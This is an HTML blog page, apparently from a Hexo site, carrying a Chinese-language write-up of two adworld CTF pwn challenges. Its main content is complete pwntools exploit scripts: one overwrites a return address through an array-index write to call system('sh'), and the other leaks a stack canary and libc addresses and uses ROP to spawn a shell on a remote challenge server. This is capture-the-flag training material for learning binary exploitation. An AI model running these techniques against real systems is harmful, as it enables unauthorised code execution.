@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <link rel="stylesheet" href="/style/style.css">
+<script>
+  var nlviconfig = {
+    title: "dyf",
+    author: "dyf",
+    baseUrl: "/",
+    theme: {
+      scheme: "banderole",
+      lightbox: true,
+      animate: true,
+      search: true,
+      friends: false,
+      reward: false,
+      lazy: false
+    }
+  }
+</script>
+
+
+
+
+    <link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">
+
+
+
+
+    <link rel="stylesheet" href="/syuanpi/syuanpi.min.css">
+
+
+
+
+
+
+
+
+
+
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="browsermode" content="application">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="dyf">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="msapplication-navbutton-color" content="#666666">
+<meta name="format-detection" content="telephone=no">
+<meta name="keywords" content="nlvi, Nlvi">
+
+
+
+
+
+  <meta name="keywords" content="thinking, Nlvi">
+
+  <title> adworld_pwn部分writeUp · dyf </title>
+</head>
+<body>
+  <div class="progress">
+  <div class="progress-inner"></div>
+</div>
+
+  
+    <div class="tagcloud-mask"></div>  
+<div class="tagcloud" id="tagcloud">
+  <div class="tagcloud-inner">
+    <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
+  </div>
+</div>
+  
+
+  <div class="container" style="display:none;">
+
+    <header class="header" id="header">
+  <div class="header-wrapper">
+    <div class="logo">
+  <div class="logo-inner syuanpi tvIn">
+    <span><a href="/">dyf</a></span>
+    
+  </div>
+</div>
+    <nav class="main-nav">
+  
+  <ul class="main-nav-list syuanpi tvIn">
+  
+    <li class="menu-item">
+      <a href="javascript:;" id="search">
+        <span>Search</span>
+        
+          <span class="menu-item-label">search</span>
+        
+      </a>
+    </li>
+  
+  
+    
+      
+    
+    <li class="menu-item">
+      <a href="/" id="article">
+        <span class="base-name">Articles</span>
+        
+          <span class="menu-item-label">article</span>
+        
+      </a>
+    </li>
+  
+    
+      
+    
+    <li class="menu-item">
+      <a href="/archives" id="archives">
+        <span class="base-name">Archives</span>
+        
+          <span class="menu-item-label">archives</span>
+        
+      </a>
+    </li>
+  
+    
+      
+    
+    <li class="menu-item">
+      <a href="javascript:;" id="tags">
+        <span class="base-name">Tags</span>
+        
+          <span class="menu-item-label">tags</span>
+        
+      </a>
+    </li>
+  
+    
+      
+    
+    <li class="menu-item">
+      <a href="/about" id="about">
+        <span class="base-name">About</span>
+        
+          <span class="menu-item-label">about</span>
+        
+      </a>
+    </li>
+  
+  </ul>
+  
+</nav>
+
+    
+    
+  </div>
+</header>
+<div class="mobile-header">
+  <div class="mobile-header-body">
+    <div class="mobile-header-list">
+      
+        
+            <div class="mobile-nav-item">
+                <a href="/">
+                    <span>Articles</span>
+                    
+                    
+                </a>
+            </div>
+        
+      
+        
+            <div class="mobile-nav-item">
+                <a href="/archives">
+                    <span>Archives</span>
+                    
+                    
+                </a>
+            </div>
+        
+      
+        
+          <div class="mobile-nav-item inner-cloud">
+            <div class="mobile-nav-tag">
+              <a href="javascript:;" id="mobile-tags">
+                <span>Tags</span>
+                
+                
+              </a>
+            </div>
+            <div class="mobile-nav-tagcloud">
+              <div class="mobile-tagcloud-inner">
+                <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
+              </div>
+            </div>
+          </div>
+        
+      
+        
+            <div class="mobile-nav-item">
+                <a href="/about">
+                    <span>About</span>
+                    
+                    
+                </a>
+            </div>
+        
+      
+    </div>
+  </div>
+  <div class="mobile-header-nav">
+    <div class="mobile-header-item" id="mobile-left">
+      <div class="header-menu-item">
+        <span class="header-menu-line"></span>
+      </div>
+    </div>
+    <h1 class="mobile-header-title">
+      <a href="/">dyf</a>
+    </h1>
+    <div class="mobile-header-item"></div>
+  </div>
+</div>
+    <div class="container-inner">
+
+    <h1 style="
+    text-align:center;
+    font-family:cathsgbr;
+    color: #FC5185;
+    font-weight:500;
+    font-size:30px;
+    ">The dyf's blog</h1>
+
+      <main class="main" id="main">
+        <div class="main-wrapper">
+          
+    
+  
+
+
+  <article class="
+  post
+   is_post 
+  ">
+    <header class="post-header">
+      <div class="post-time syuanpi fadeInUpShort back-1">
+        <div class="post-time-wrapper">
+          <span>2019-06-03</span>
+          
+          
+            
+              <aside class="post-tags syuanpi fadeInUpShort back-3">
+              
+                <a href="/tags/thinking/">thinking</a>
+              
+              </aside>
+            
+          
+        </div>
+      </div>
+      <h1 class="post-title syuanpi fadeInUpShort back-2">
+        
+          adworld_pwn部分writeUp
+        
+      </h1>
+    </header>
+    <div class="post-content syuanpi fadeInUpShort back-3">
+      
+        <h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><hr>
+<p>&emsp;&emsp;首先checksec一下发现有canary，然后托到ida里看一下，发现大部分变量都是 <strong>unsigned int</strong> 类型，考虑到可能会有整数溢出。接着我们发现可以通过 <strong>change number</strong> 选项来直接修改栈上的数据，因此我们想到直接修改返回地址，如图：  </p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_1.jpg?raw=true" alt="stack2_1"></p>
+<p>&emsp;&emsp;接着我们发现 <strong>hackhere</strong> 函数，里面是直接调用的  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/bin/bash"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_2.jpg?raw=true" alt="stack2_2"><br>&emsp;&emsp;因此，我们可以直接将返回地址修改为这里，我们注意到数组的类型是 <strong>char</strong> ，因此在发送payload的时候可以直接按照小端序字符逐位发送。</p>
+<p>&emsp;&emsp;但是这里有一个坑点，我们通过静态分析发现数组距离 <strong>return_addr</strong> 的位置为0x74：  </p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/stack2_3.jpg?raw=true" alt="stack2_3">  </p>
+<p>&emsp;&emsp;但是我们在实际动态调试的时候发现其实际偏移为0x84，这里是因为，在进入main函数时进行了一步esp的对齐：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#开头</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           0x080485d0      8d4c2404       lea ecx, dword [arg_4h]     ; 4</span><br><span class="line">|           0x080485d4      83e4f0             and esp, 0xfffffff0</span><br><span class="line">|           0x080485d7      ff71fc               push dword [ecx - 4]</span><br><span class="line">|           0x080485da      55                      push ebp</span><br><span class="line">|           0x080485db      89e5                 mov ebp, esp</span><br><span class="line">|           0x080485dd      51                      push ecx</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">#结尾</span><br><span class="line">|           0x080488eb      8b4dfc         mov ecx, dword [local_4h]</span><br><span class="line">|           0x080488ee      c9             leave</span><br><span class="line">|           0x080488ef      8d61fc         lea esp, dword [ecx - 4]</span><br><span class="line">\           0x080488f2      c3             ret</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;其实这里没有必要深入计算，因为动态调试可以算出偏移为0x84,但是作为一个知识点，我们还是要讨论一下这个main函数的返回方式，我们遇到过很多main函数通过ecx进行返回，并且有esp对其的过程。  </p>
+<p>&emsp;&emsp;这一次，首先将 <strong>$esp + 4</strong> 放入ecx，然后 <code>and esp,0xfffffff0</code> 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 <strong>$ecx - 4</strong> 压入栈中。注意，这里的 <strong>$ecx - 4</strong> 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 <code>lea ecx, dword [arg_4h]</code> 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样：  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">						high                                |		arg_4		 |</span><br><span class="line">											 |	return_addr        |             return_addr <span class="number">1</span>                                  </span><br><span class="line">											 |	 .....................	  |</span><br><span class="line"></span><br><span class="line">after align	               							     some span</span><br><span class="line"></span><br><span class="line">											 |		ecx - <span class="number">4</span>		  |				return_addr  <span class="number">2</span></span><br><span class="line">											 |		    ebp              |</span><br><span class="line">											 |                  ecx               |</span><br><span class="line">			 			low                                  |      ....................         |</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;返回的时候就恢复ecx的值然后直接利用 <strong>[ecx - 4]</strong> 回到return_addr1的位置。</p>
+<p>因此，payload如下：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">system_addr = <span class="number">0x804859B</span></span><br><span class="line"><span class="comment">#sh = process("./stack2")</span></span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">53413</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(index, value)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(value))</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">fuck(<span class="number">0x84</span>,<span class="number">0x9b</span>)</span><br><span class="line">fuck(<span class="number">0x85</span>,<span class="number">0x85</span>)</span><br><span class="line">fuck(<span class="number">0x86</span>,<span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x87</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;但是打过去之后发现系统提示:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/usr/bin/bash"</span> not found</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;所以我们只好直接调用 <strong>system</strong>函数，并将sh传参给它，因此payload如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./stack2")</span></span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">53413</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x0804859b</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(index, value)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(value))</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">fuck(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">fuck(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">fuck(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#中间流出了4个字节，用于存放 fake_return_address</span></span><br><span class="line">fuck(<span class="number">0x8c</span>, <span class="number">0x87</span>)           <span class="comment">#这里我们发现地址是奇数位，是因为我们直接把bash拆开成了sh</span></span><br><span class="line">fuck(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">fuck(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">fuck(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="pwn1-babystack"><a href="#pwn1-babystack" class="headerlink" title="pwn1 babystack"></a>pwn1 babystack</h3><p>&emsp;&emsp;checksec后我们发现程序开启了canary，大概要进行canary的泄漏。  </p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_1.png?raw=true" alt="checksec">  </p>
+<p>&emsp;&emsp;在对main函数进行静态分析后我们发现了一个明显的溢出点，<strong> read()</strong> 函数存在经典溢出，而且在  <strong>case 2</strong> 处我们可以通过 <strong>puts()</strong> 函数泄露canary的值。  </p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_2.png?raw=ture" alt="overflow"></p>
+<p>&emsp;&emsp;对于canary的泄漏方式，最简单的一种是覆盖其最低为的 <em>\x00</em> 字节，防止截断，然后通过puts将其泄漏出来。  </p>
+<p>&emsp;&emsp;仔细审计程序之后，我们基本清楚了攻击流程，首先这是一个经典的菜单类程序，通过case 1我们可以覆盖栈上的数据，因此，第一步我们先填充padding来覆盖canary的低位字节经计算offset为136个字节。</p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_3.png?raw=true" alt="canary"></p>
+<p>&emsp;&emsp;接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 <code>pop rdi ; ret</code> .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。  </p>
+<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/babstack_4.png?raw=true" alt="rop"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#  sh = process('./babystack')</span></span><br><span class="line">sh = remote(<span class="string">'111.198.29.45'</span>,<span class="number">35646</span>) </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00400a93</span></span><br><span class="line">main = <span class="number">0x00400908</span></span><br><span class="line">log.info(<span class="string">'puts_got '</span> + hex(puts_got))</span><br><span class="line">log.info(<span class="string">'puts_plt '</span> + hex(puts_plt))</span><br><span class="line">log.info(<span class="string">'puts_libc '</span> + hex(puts_libc))</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'a'</span> * <span class="number">136</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get_canary</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.sendline(padding)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'a'</span> * <span class="number">136</span>)</span><br><span class="line">canary = u64(sh.recv()[:<span class="number">8</span>]) - <span class="number">0xa</span></span><br><span class="line">log.info(<span class="string">'canary '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_system</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTarget</span><span class="params">(target, canary)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x90</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">'b'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(target) + p64(puts_plt)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    <span class="comment">#  sh.recvuntil('b'*8)</span></span><br><span class="line">    addr = u64(sh.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\n'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr = getTarget(puts_got, canary)</span><br><span class="line">log.info(<span class="string">'puts_addr '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_offset_system_bin_sh </span></span><br><span class="line">offset = puts_addr - puts_libc</span><br><span class="line">system_addr = system_libc + offset </span><br><span class="line">bin_sh = offset + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.info(<span class="string">'system_addr '</span> + hex(system_addr))</span><br><span class="line">log.info(<span class="string">'bin_sh '</span> + hex(bin_sh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fuckup</span></span><br><span class="line">sh.sendline(<span class="string">'\n'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x90</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">'b'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload += p64(main)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;在输入输出那里比较坑，需要多调几下。</p>
+
+      
+    
+    </div>
+    
+      
+
+      
+  <hr class="copy-line">
+  <div class="post-copyright">
+    <div class="copy-author">
+      <span>Author :</span>
+      <span>dyf</span>
+    </div>
+    <div class="copy-url">
+      <span>Url :</span>
+      <a href="http://blog.dyf.ink/2019/06/03/adworld-pwn部分writeUp/">http://blog.dyf.ink/2019/06/03/adworld-pwn部分writeUp/</a>
+    </div>
+    <div class="copy-origin">
+      <span>Origin :</span>
+      <a href="http://blog.dyf.ink">http://blog.dyf.ink</a>
+    </div>
+    <div class="copy-license">
+      
+      著作权归作者所有，转载请联系作者获得授权。
+    </div>
+  </div>
+
+    
+  </article>
+  
+    
+  <nav class="article-page">
+    
+      <a href="/2019/08/23/蓝帽杯awd总结/" id="art-left" class="art-left">
+        <span class="next-title">
+          <i class="iconfont icon-left"></i>蓝帽杯awd总结
+        </span>
+      </a>
+    
+    
+      <a href="/2019/04/11/关于libc与rop的思考/" id="art-right" class="art-right">
+        <span class="prev-title"> 
+          关于libc与rop的思考<i class="iconfont icon-right"></i>  
+        </span>
+      </a>
+    
+  </nav>
+
+    
+  <i id="com-switch" class="iconfont icon-more jumping-in long infinite" style="font-size:24px;display:block;text-align:center;transform:rotate(180deg);"></i>
+  <div class="post-comments" id="post-comments" style="display: block;margin: auto 16px;">
+    
+    
+    
+
+    
+
+  </div>
+
+
+
+  
+  
+    
+  
+
+  <aside class="post-toc">
+    <span class="title" id="toc-switch"><span>Index</span></span>
+    <div class="toc-inner syuanpi back-1" style="display:none;">
+      <li class="title-link"><a href="javascript:;" class="toTop">adworld_pwn部分writeUp</a></li>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#stack2"><span class="toc-text">stack2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1-babystack"><span class="toc-text">pwn1 babystack</span></a></li></ol>
+    </div>
+  </aside>
+
+
+
+  
+
+
+        </div>
+      </main>
+
+      <footer class="footer syuanpi fadeIn" id="footer">
+  <hr>
+  <div class="footer-wrapper">
+    <div class="left">
+      <div class="contact-icon">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+        
+        
+        
+        
+        
+            <a href="https://www.facebook.com/dong.yifan.1" class="iconfont icon-social-facebook" title="facebook"></a>
+        
+        
+        
+        
+    
+        
+        
+        
+            <a href="https://twitter.com/dong_yifan" class="iconfont icon-social-twitter" title="twitter"></a>
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+            <a href="https://www.zhihu.com/people/aurora-56-20/activities" class="iconfont icon-zhihu" title="zhihu"></a>
+        
+        
+        
+        
+        
+    
+        
+            <a href="https://github.com/Explainaur" class="iconfont icon-social-github" title="github"></a>
+        
+        
+        
+        
+        
+        
+        
+        
+    
+</div>
+
+    </div>
+    <div class="right">
+      <div class="copyright">
+    <div class="info">
+        <span>&copy;</span>
+        <span>2016 ~ 2020</span>
+        <span>❤</span>
+        <span>dyf</span>
+    </div>
+    <div class="theme">
+        <span>
+            Powered by
+            <a href="http://hexo.io/" target="_blank">Hexo </a>
+        </span>
+        <span>
+            Theme
+            <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
+        </span>
+    </div>
+    
+</div>
+
+    </div>
+  </div>
+</footer>
+    </div>
+  </div>
+  <script src="/script/lib/jquery/jquery-3.2.1.min.js"></script>
+
+
+  <script src="/script/lib/lightbox/js/lightbox.min.js"></script>
+
+
+
+
+
+
+
+
+<script src="/script/src/nlvi.js"></script>
+
+  <script src="/script/scheme/banderole.js"></script>
+
+<script src="/script/bootstarp.js"></script>
+
+
+<div class="backtop syuanpi melt toTop" id="backtop">
+    <i class="iconfont icon-up"></i>
+    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
+</div>
+
+
+  <div class="search" id="search">
+    <div class="mask" id="mask"></div>
+    <div class="search-wrapper syuanpi">
+      <h2 id="search-header" class="syuanpi">Search？</h2>
+      <div class="input">
+        <input type="text" id="local-search-input" results="0" name>
+      </div>
+      <div id="local-search-result"></div>
+    </div>
+  </div>
+
+
+</body>
+</html>
